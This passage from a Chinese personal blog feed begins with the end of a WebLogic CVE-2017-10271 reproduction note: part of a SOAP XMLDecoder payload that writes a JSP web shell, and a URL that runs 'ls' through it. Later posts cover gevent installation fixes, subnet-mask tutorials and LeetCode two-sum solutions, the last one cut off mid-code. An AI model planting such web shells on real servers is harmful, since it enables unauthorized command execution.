 byte[] b = <span class="keyword">new</span> byte[<span class="number">2048</span>];</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">        out.pr<span class="built_in">int</span>(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">        <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=<span class="number">-1</span>)&#123;</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">            out.println(<span class="keyword">new</span> <span class="built_in">String</span>(b));</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">        &#125;</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">        out.pr<span class="built_in">int</span>(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">    &#125;</span></span></span><br><span class="line"><span class="language-vbscript"><span class="language-vbscript-html">%&gt;</span><span class="language-xml">]]&gt;<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6t3vgj312c0ian1t.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6t3vgj312c0ian1t.jpg" class="lazyload"></a></p>
<h2 id="访问-shell"><a href="#访问-shell" class="headerlink" title="访问 shell"></a>访问 shell</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your-ip:7001/bea_wls_internal/test.jsp?pwd=yakko&amp;i=ls</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pqkzj30kp07rmxd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pqkzj30kp07rmxd.jpg" class="lazyload"></a></p>
<hr>
<h1 id="扯一下"><a href="#扯一下" class="headerlink" title="扯一下"></a>扯一下</h1><p>不知不觉开学了，本来还说要多A几道题，多看些书，结果50来天的寒假就结束了，淦，啥都没看，摸鱼摸着摸着就要毕业了，也曾梦想仗剑走天涯，结果发现自己什么本领都没有，只能望着远方的渐行渐远的身影，迷茫着不知道自己该何去何从。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6plqrj30g40f5767.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6plqrj30g40f5767.jpg" class="lazyload"></a></p>
<p>参考链接如下<br><a href="https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html">Weblogic(CVE-2017-10271)漏洞复现</a><br><a href="https://paper.seebug.org/487/">Weblogic XMLDecoder RCE分析</a><br><a href="https://blog.51cto.com/duallay/1961598">XMLDecoder反序列化漏洞</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Python 第三方库 Gevent 安装遇到的问题和解决方法</title>
    <url>/yakko117/2020/02/07/gevent/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>最近找到个 <code>TPscan</code> 的脚本工具，但是依赖库缺失<br>按着百度的方法试了一大堆都不行，然后自己找点其他的办法来解决</p>
<span id="more"></span>

<h1 id="pip-遇到的问题"><a href="#pip-遇到的问题" class="headerlink" title="pip 遇到的问题"></a>pip 遇到的问题</h1><h2 id="pip版本太低"><a href="#pip版本太低" class="headerlink" title="pip版本太低"></a>pip版本太低</h2><p>使用命令 <code>pip install gevent</code> 时， 回显 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You are using pip version 19.2.1, however version 20.0.2 is available</span><br></pre></td></tr></table></figure></div>

<p>这个简单，通过升级 pip 可以解决</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jo5ncj306o03mt8o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jo5ncj306o03mt8o.jpg" class="lazyload"></a></p>
<hr>
<h2 id="超时报错-Read-timed-out"><a href="#超时报错-Read-timed-out" class="headerlink" title="超时报错 Read timed out"></a>超时报错 Read timed out</h2><p>解决了 <code>pip</code> 版本问题之后，使用 <code>pip</code> 安装， 结果飘了一大段红</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pip._vendor.requests.packages.urllib3.exceptions.ReadTimeoutError: HTTPSConnectionPool(host=&#x27;pypi.python.org&#x27;, port=443): Read timed out.</span><br></pre></td></tr></table></figure></div>

<p>会出现上述问题，主要是因为网络问题，Python依赖库都是外网的，尤其是第三方的这种小作坊产品，国内访问速度太慢，下载链接时断时续，看了网上的几种解决方法，效果都一般</p>
<h3 id="方法一-设置超时时间"><a href="#方法一-设置超时时间" class="headerlink" title="方法一 设置超时时间"></a>方法一 设置超时时间</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip --default-timeout=100 install -U gevent(对应的是依赖包模块的名称)</span><br></pre></td></tr></table></figure></div>

<p>或者</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install --default-timeout=1000 --no-cache-dir -r requirements.txt</span><br></pre></td></tr></table></figure></div>

<p>然后就会发现，虽然不会报错了，结果也没有其他的回显了</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jpczej306o06o0sv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jpczej306o06o0sv.jpg" class="lazyload"></a></p>
<hr>
<h3 id="方法二-pip源更换"><a href="#方法二-pip源更换" class="headerlink" title="方法二 pip源更换"></a>方法二 pip源更换</h3><p>这样就能解决被墙导致的装不上库的烦恼。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">豆瓣：http://pypi.douban.com/simple/</span><br><span class="line"></span><br><span class="line">    清华：https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div>

<p>通过使用清华源 的确下载速度快了不少</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple gevent</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jol3pj30ii04rt98.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jol3pj30ii04rt98.jpg" class="lazyload"></a></p>
<p>但还是安装不上，然后我直接从源下载了 <code>gevent</code> 包<br>发现<code>gevent 1.4.0</code> 的版本只支持<code>python 3.7</code>的版本，我的是<code>python3.8</code> 32位的</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jnj5pj306o053gll.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jnj5pj306o053gll.jpg" class="lazyload"></a></p>
<p><strong>一定要注意版本！ 注意版本！ 注意版本！</strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6joytoj309509nglm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6joytoj309509nglm.jpg" class="lazyload"></a></p>
<p>然后网上找到了适合3.8版本的 <code>gevent-1.5a3-cp38-cp38-win32.whl</code></p>
<p>然后经过漫长的等待安装，终于好了</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jqgiej30tk0bytg3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jqgiej30tk0bytg3.jpg" class="lazyload"></a></p>
<p>然后尝试跑一遍，可行，就很舒服</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jrc7dj309f06xt8l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jrc7dj309f06xt8l.jpg" class="lazyload"></a></p>
<hr>
<h1 id="依赖包问题"><a href="#依赖包问题" class="headerlink" title="依赖包问题"></a>依赖包问题</h1><p>然后除了上述问题之外，还存在其他依赖包问题<br>如果要用 <code>gevent</code> 做网络工程<br>需要添加其他依赖包</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple greenlet</span><br><span class="line"></span><br><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple libevent</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>子网划分和子网掩码计算方法</title>
    <url>/yakko117/2020/03/06/ip%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h1><p><code>子网划分</code> 是通过借用IP地址中若干位主机地址来充当子网的网络地址，从而将原网络划分为若干子网。</p>
<h2 id="为什么划分子网"><a href="#为什么划分子网" class="headerlink" title="为什么划分子网"></a>为什么划分子网</h2><ul>
<li>IP地址空间的利用率有时候不高</li>
</ul>
<p>举个例子：在A类IP地址中，每个A类网络可能有16777214台主机，它们处于同一广播域。在同一广播域中有这么多主机是不可能的，网络会因为广播通信而饱和，因此要划分子网减少不必要的网络流量 <code>(优化网络性能)</code>。</p>
<ul>
<li>两级IP地址不够灵活</li>
</ul>
<p>IP地址资源越来越少，WAN链路比LAN链路的速度慢得多，且更昂贵;如果纯粹用大跨度的大型网络，进行流量数据交互，利用率不高。<br>因此为实现更小的广播域 <code>(提高系统效率)</code>，就需要进一步分成更小的网络。划分子网后，通过使用掩码，把子网隐藏起来，使得从外部看网络没有变化，这就是子网掩码。</p>
<p>当某个单位划分子网后，对外仍然 <code>表现为一个网络</code> ，除本单位之外的网络看不见本单位的子网划分。</p>
<h2 id="子网分类"><a href="#子网分类" class="headerlink" title="子网分类"></a>子网分类</h2><p>划分子网时，随着子网地址借用主机位数的增多，子网的数目随之增加，但每个子网中的可用主机数逐渐减少。<br>如 <code>C类地址</code>，原有8位主机位，$2^8$-2即254个主机地址，默认子网掩码255.255.255.0。(全0或全1不可用）<br>借用1位主机位，产生$2^1$&#x3D;2个子网，每个子网有$2^7$个主机地址;<br>借用2位主机位，产生$2^2$&#x3D;4个子网，每个子网有$2^6$个主机地址;<br>…<br>具体如下图<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fwftij318d0iddi8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fwftij318d0iddi8.jpg" class="lazyload"></a></p>
<h2 id="明确子网划分的需求"><a href="#明确子网划分的需求" class="headerlink" title="明确子网划分的需求"></a>明确子网划分的需求</h2><ul>
<li><p>确定需要的网络ID数:</p>
<ul>
<li>每个LAN子网一个;</li>
<li>每条广域网连接一个。</li>
</ul>
</li>
<li><p>确定每个子网所需的主机数:</p>
<ul>
<li>每个TCP&#x2F;IP主机一个;</li>
<li>每个路由器接口一个。</li>
</ul>
</li>
<li><p>需要一个用于整个网络的子网掩码;</p>
<ul>
<li>每个物理网段的唯一子网ID;</li>
<li>每个子网的主机范围。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h1><h2 id="概述及作用"><a href="#概述及作用" class="headerlink" title="概述及作用"></a>概述及作用</h2><ol>
<li>子网掩码是一个应用于TCP&#x2F;IP网络的32位二进制值，每节8位，必须结合IP地址对应使用。</li>
<li>子网掩码32位都与IP地址32位对应，如果某位是<font color="6495ED">网络地址，则子网掩码为1，否则为0。</font></li>
<li>子网掩码可以通过与 <code>IP地址&quot;与&quot;计算</code>，分离出IP地址中的网络地址和主机地址，用于判断该IP地址是在局域网上，还是在广域网上。</li>
<li>子网掩码一般用于将网络进一步划分为若干子网，以避免主机过多而拥堵或过少而IP浪费。(上面也提到了)</li>
</ol>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fv8ckj30pf0fy75p.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fv8ckj30pf0fy75p.jpg" class="lazyload"></a></p>
<h2 id="为什么要使用子网掩码"><a href="#为什么要使用子网掩码" class="headerlink" title="为什么要使用子网掩码"></a>为什么要使用子网掩码</h2><p>子网掩码可以分离出IP地址中的网络地址和主机地址，那为什么要分离呢？因为两台计算机要通讯，首先要判断是否处于同一个广播域内，即网络地址是否相同。如果网络地址相同，表明接受方在本网络上，那么可以把数据包直接发送到目标主机，<font color="6495ED">否则就需要路由网关将数据包转发送到目的地。</font></p>
<hr>
<h2 id="子网掩码的分类"><a href="#子网掩码的分类" class="headerlink" title="子网掩码的分类"></a>子网掩码的分类</h2><h3 id="缺省子网掩码："><a href="#缺省子网掩码：" class="headerlink" title="缺省子网掩码："></a>缺省子网掩码：</h3><p>(未划分子网)<br>子网掩码32位与IP地址32位对应,如果某位是网络地址，则子网掩码为1，否则为0。<br>例如A类IP地址，第一节为网络地址，其余三节为主机地址<br>故掩码为<code>11111111.00000000.00000000.00000000</code></p>
<p><font color="6495ED">A类网络</font> 缺省子网掩码：<code>255.0.0.0</code><br><font color="6495ED">B类网络</font> 缺省子网掩码：<code>255.255.0.0</code><br><font color="6495ED">C类网络</font> 缺省子网掩码：<code>255.255.255.0</code></p>
<h3 id="自定义子网掩码："><a href="#自定义子网掩码：" class="headerlink" title="自定义子网掩码："></a>自定义子网掩码：</h3><p>将一个网络划分为若干子网，希望每个子网拥有不同的网络地址或子网地址。因为ＩＰ是有限的，实际上我们是将主机地址分为两个部分：子网网络地址、子网主机地址。形式如下：<br>未做子网划分的ip地址：<strong>网络地址＋主机地址</strong><br>做子网划分后的ip地址：<strong>网络地址＋（子网网络地址＋子网主机地址）</strong></p>
<h3 id="子网掩码和ip地址的关系"><a href="#子网掩码和ip地址的关系" class="headerlink" title="子网掩码和ip地址的关系"></a>子网掩码和ip地址的关系</h3><p>设IP地址为192.168.10.2，子网掩码为255.255.255.240，那么子网掩码是怎样来区分网络地址和主机地址的呢。</p>
<p>主机地址为：0.0.0.2（将掩码取反，然后与IP地址进行与运算）</p>
<p><font color="6495ED">与运算</font>:对应位全是 <code>1</code> 结果为 <code>1</code> ,否则为 <code>0</code><br><font color="6495ED">或运算</font>:对应位全是 <code>0</code> 结果为 <code>0</code>, 否则为 <code>1</code></p>
<hr>
<h1 id="子网掩码习题"><a href="#子网掩码习题" class="headerlink" title="子网掩码习题"></a>子网掩码习题</h1><h2 id="例-1"><a href="#例-1" class="headerlink" title="例 1"></a>例 1</h2><p><strong>已知IP地址是 <code>141.14.72.24</code>， 子网掩码是 <code>255.255.192.0</code> 求网络地址</strong></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>首先通过子网掩码和IP地址进行与运算，可以推断网络地址为 <code>141.14.xx.0</code></p>
<p>然后只需要知道 <code>72</code> 和 <code>192</code> 的二进制<br>首先 <code>72</code> &#x3D; <code>0100 1000</code><br>然后 <code>192</code>&#x3D; <code>1100 0000</code><br>进行与运算可以得到 <code>0100 0000</code> &#x3D; <code>64</code></p>
<p>同时可以知道 <code>1100 0000</code> 子网号占了 <code>2</code> 个位，剩下14（6+8）位为主机号，即有 $2^{14}$ 个主机</p>
<p>主机号全 <code>0</code> 表示这个网络段本身称之为: <code>网络号</code><br>主机号全 <code>1</code> 的地址称之为: <code>广播地址</code></p>
<p>然后写个表，用来记一下常规数据的二进制</p>
<table>
<thead>
<tr>
<th align="center">二进制</th>
<th align="right">十进制</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1000 0000</td>
<td align="right">128</td>
</tr>
<tr>
<td align="center">1100 0000</td>
<td align="right">192</td>
</tr>
<tr>
<td align="center">1110 0000</td>
<td align="right">224</td>
</tr>
<tr>
<td align="center">1111 0000</td>
<td align="right">240</td>
</tr>
<tr>
<td align="center">1111 1000</td>
<td align="right">248</td>
</tr>
<tr>
<td align="center">1111 1100</td>
<td align="right">252</td>
</tr>
<tr>
<td align="center">1111 1110</td>
<td align="right">254</td>
</tr>
<tr>
<td align="center">1111 1111</td>
<td align="right">255</td>
</tr>
</tbody></table>
<hr>
<h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p><strong>某主机的 <code>IP地址</code>为 <code>180.80.77.55</code>，子网掩码为 <code>255.255.252.0</code>。若该主机向其所在的子网发送广播分组，则目的地址可以为</strong></p>
<p>A. 180.80.76.0<br>B. 180.80.76.255<br>C. 180.80.77.255<br>D. 180.80.79.255</p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>首先值得注意是向子网发送 <font color="6495ED">广播分组</font><br><font color="6495ED">广播分组</font> 即为 <font color="6495ED">广播地址</font> 也就是主机号全 <code>1</code></p>
<p>因此可以首先排除A选项，然后可以关注到子网掩码的第三个位置是 <code>252</code><br>由上面的表可以知道二进制编码为 <code>1111 1100</code><br>也就是说前面共有 <code>8+8+6=22</code> 位为 <font color="6495ED">网络号+子网号</font> 后面的 <code>10位</code> 为主机号<br>然后看 <code>IP地址</code> <code>180.80.77.55</code><br>77 &#x3D; <font color="6495ED">0100 11</font>01<br>可以判断主机所在的子网号为 <code>180.80.76.xxx</code><br>然后因为要找的是<font color="6495ED">目的地址</font>，所以所有的主机号都要为 1，所以第三位ip应该变成 <font color="6495ED">0100 1111</font> 即为 76+3&#x3D;79，所以答案选 D</p>
<hr>
<h1 id="路由器转发分组的算法"><a href="#路由器转发分组的算法" class="headerlink" title="路由器转发分组的算法"></a>路由器转发分组的算法</h1><h2 id="提取目的IP地址"><a href="#提取目的IP地址" class="headerlink" title="提取目的IP地址"></a>提取目的IP地址</h2><p>从分组的首部提取目的IP地址 <code>D</code></p>
<h2 id="是否直接交付"><a href="#是否直接交付" class="headerlink" title="是否直接交付"></a>是否直接交付</h2><p>先用<font color="6495ED">与该路由器直接相连的网络</font>的子网掩码与IP地址 <code>D</code> 进行与运算，看结果是否与相应的网络，地址相匹配。若匹配，则进行直接交付。否则就是间接交付，马上执行下一步</p>
<h2 id="特定主机路由"><a href="#特定主机路由" class="headerlink" title="特定主机路由"></a>特定主机路由</h2><p>若路由表中有一条到目的主机 <code>D</code> 的特定路由，则将分组转发给其指明的下一跳路由器。否则执行下一步</p>
<h2 id="检测路由表中有无路径"><a href="#检测路由表中有无路径" class="headerlink" title="检测路由表中有无路径"></a>检测路由表中有无路径</h2><p>对路由表中每一行的子网掩码和D进行与运算，若结果与该行的目的网络地址匹配，则将分组传给该行指明的下一跳路由器。否则执行下一步</p>
<h2 id="默认路由-0-0-0-0"><a href="#默认路由-0-0-0-0" class="headerlink" title="默认路由 0.0.0.0"></a>默认路由 0.0.0.0</h2><p>若路由表中有一个默认路由，则将分组传给路由表中指明的默认路由器。<br>否则执行最后一步</p>
<h2 id="丢弃"><a href="#丢弃" class="headerlink" title="丢弃"></a>丢弃</h2><p>报告转发分组出错</p>
]]></content>
      <categories>
        <category>瞎扯</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode Python学习笔记(一)</title>
    <url>/yakko117/2019/07/11/leetcode1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="算法篇"><a href="#算法篇" class="headerlink" title="算法篇"></a>算法篇</h1><h2 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h2><p>给定一个整数数组 <code>nums</code> 和一个目标值 <code>target</code>，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p>
<p>给定 nums &#x3D; [2, 7, 11, 15], target &#x3D; 9<br>因为 nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9<br>所以返回 [0, 1]</p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>用时20ms</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums, target</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 用len()方法取得nums列表的长度</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># a取值从0一直到n（不包括n）</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        </span><br><span class="line">            <span class="comment"># b取值从a+1一直到n（不包括n）</span></span><br><span class="line">            <span class="comment"># 用a+1是减少不必要的循环, b的取值肯定是比a大</span></span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(a+<span class="number">1</span>, n):</span><br><span class="line">            </span><br><span class="line">                <span class="comment"># 假如 target-nums[a] 的某个值存在于nums中</span></span><br><span class="line">                <span class="comment"># 返回 a b</span></span><br><span class="line">                <span class="keyword">if</span> nums[b] == target - nums[a]:</span><br><span class="line">                    <span class="keyword">return</span> a, b</span><br><span class="line">                    <span class="keyword">break</span>       </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>

<p>用一个嵌套循环把nums列表遍历两次，但是时间复杂度是O(n&amp;sup2;)，可以去考虑下其他时间复杂度低的方法</p>
<hr>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>用时12ms</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self,nums, target</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 用len()方法取得nums列表长度</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="comment"># a从0到n取值（不包括n）</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            i = target - nums[a]</span><br><span class="line">            <span class="comment"># 用in关键字查询nums列表中是否有i</span></span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> nums:</span><br><span class="line">                <span class="comment"># 用index函数取得i的值在nums列表中的索引</span></span><br><span class="line">                b = nums.index(i)</span><br><span class="line">                <span class="comment"># 假如a=b, 那么就跳过, 否则返回a,b</span></span><br><span class="line">                <span class="keyword">if</span> a == b:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> a, b</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>
<p>用一个for循环，直接在里面查询 <code>target-nums[a]</code> 是否存在于 <code>nums</code> 列表中，速度比方法1快了许多</p>
<hr>
<h3 id="方法3（看了大佬的解法，学习学习）"><a href="#方法3（看了大佬的解法，学习学习）" class="headerlink" title="方法3（看了大佬的解法，学习学习）"></a>方法3（看了大佬的解法，学习学习）</h3><p>用时36ms<br>先创建一个空字典，然后依次把 <code>target-nums[a]</code> 的值存入字典，存入一个就跟 <code>nums[a+1]</code> 去比较， 字典中的key为 <code>target-nums[a]</code>，value为 <code>a</code>，也就是 <code>nums[a]</code> 在nums列表中的索引位置。当字典d中有 <code>nums[a+1]</code>时，也就是 <code>target - nums[b] = nums[a+1]</code>， i肯定是小于a+1的(因为i是a+1之前循环过的数字)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self,nums, target</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 用len()方法取得nums列表长度</span></span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#创建一个空字典</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            i = target - nums[a]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 字典d中存在nums[a]时</span></span><br><span 